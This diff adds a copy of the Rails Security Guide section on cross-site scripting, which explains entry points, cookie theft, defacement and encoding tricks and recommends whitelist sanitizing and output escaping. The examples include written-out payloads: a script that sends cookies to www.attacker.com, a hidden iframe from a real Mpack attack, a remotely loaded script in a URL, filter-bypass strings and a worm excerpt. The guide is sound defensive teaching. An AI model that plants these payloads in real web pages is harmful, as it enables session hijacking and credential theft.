@@ -1,0 +1,139 @@
+http://guides.rubyonrails.org/security.html#cross-site-scripting-xss
+
+7.3 Cross-Site Scripting (XSS)
+The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. 
+This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off.
+
+7.3.1 Entry Points
+An entry point is a vulnerable URL and its parameters where an attacker can start an attack.
+
+The most common entry points are message posts, user comments, and guest books, but project titles, document names
+and search result pages have also been vulnerable - just about everywhere where the user can input data. But the 
+input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, 
+hidden or internal. Remember that the user may intercept any traffic. Applications or client-site proxies make it
+easy to change requests. There are also other attack vectors like banner advertisements.
+
+XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page,
+later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS 
+can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit 
+of the attacker, change elements on the web site to get confidential information or install malicious software through
+security holes in the web browser.
+
+During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE,
+and 12 in Opera. The Symantec Global Internet Security threat report also documented 239 browser plug-in vulnerabilities
+in the last six months of 2007. Mpack is a very active and up-to-date attack framework which exploits these vulnerabilities. 
+For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and
+insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among
+them the British government, United Nations, and many more high profile targets.
+
+7.3.2 HTML/JavaScript Injection
+The most common XSS language is of course the most popular client-side scripting language JavaScript, often in 
+combination with HTML. Escaping user input is essential.
+
+Here is the most straightforward test to check for XSS:
+
+<script>alert('Hello');</script>
+This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:
+
+<img src=javascript:alert('Hello')>
+<table background="javascript:alert('Hello')">
+7.3.2.1 Cookie Theft
+These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the 
+user's session). 
+In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces 
+the same origin policy, 
+that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie
+of the 
+originating web server. However, you can read and write this property, if you embed the code directly in the HTML document 
+(as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:
+
+<script>document.write(document.cookie);</script>
+For an attacker, of course, this is not useful, as the victim will see their own cookie. The next example will try to 
+load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser 
+displays nothing. But the attacker can review their web server's access log files to see the victim's cookie.
+
+<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
+The log files on www.attacker.com will read like this:
+
+GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
+You can mitigate these attacks (in the obvious way) by adding the httpOnly flag to cookies, so that document.cookie may 
+not be read by JavaScript. HTTP only cookies can be used from IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4 and 
+Chrome 1.0.154 onwards. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to 
+fail to load. Be warned that cookies will still be visible using Ajax, though.
+
+7.3.2.2 Defacement
+With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim
+on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to 
+include code from external sources by iframes:
+
+<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
+This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is 
+taken from an actual attack on legitimate Italian sites using the Mpack attack framework. Mpack tries to install
+malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.
+
+A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's 
+original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide
+a legitimate link in the web application, and display another one at its place which redirects to a fake web site.
+
+Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included
+in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated 
+that "George Bush appointed a 9 year old boy to be the chairperson...":
+
+http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
+  <script src=http://www.securitylab.ru/test/sc.js></script><!--
+7.3.2.3 Countermeasures
+It is very important to filter malicious input, but it is also important to escape the output of the web application.
+
+Especially for XSS, it is important to do whitelist input filtering instead of blacklist. Whitelist filtering states the
+values allowed as opposed to the values not allowed. Blacklists are never complete.
+
+Imagine a blacklist deletes "script" from the user input. Now the attacker injects "<scrscriptipt>", and after the filter,
+"<script>" remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() 
+method. So this kind of injection was possible:
+
+strip_tags("some<<b>script>alert('hello')<</b>/script>")
+This returned "some<script>alert('hello')</script>", which makes an attack work. That's why a whitelist approach is better,
+using the updated Rails 2 method sanitize():
+
+tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
+s = sanitize(user_input, tags: tags, attributes: %w(href title))
+This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.
+
+As a second step, it is good practice to escape all output of the application, especially when re-displaying user input,
+which hasn't been input-filtered (as in the search form example earlier on). Use escapeHTML() (or its alias h()) method to
+replace the HTML input characters &, ", <, and > by their uninterpreted representations in HTML (&amp;, &quot;, &lt;, and
+&gt;).
+
+7.3.2.4 Obfuscation and Encoding Injection
+Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, 
+to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden
+in different encodings that the web browser might be able to process, but the web application might not. Here is an attack
+vector in UTF-8 encoding:
+
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
+  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate
+and encode strings, and thus "get to know your enemy", is the Hackvertor. Rails' sanitize() method does a good job to fend
+off encoding attacks.
+
+7.3.3 Examples from the Underground
+In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors.
+
+The following is an excerpt from the Js.Yamanner@m Yahoo! Mail worm. It appeared on June 11, 2006 and was the first 
+webmail interface worm:
+
+<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
+  target=""onload="var http_request = false;    var Email = '';
+  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
+The worms exploit a hole in Yahoo's HTML/JavaScript filter, which usually filters all targets and onload attributes from 
+tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm 
+code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow
+HTML/JavaScript in a web application.
+
+Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details 
+on Rosario Valotta's paper. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could
+make money with.
+
+In December 2006, 34,000 actual user names and passwords were stolen in a MySpace phishing attack. The idea of the attack
+was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and 
+CSS was used to hide the genuine MySpace content from the page and instead display its own login form.
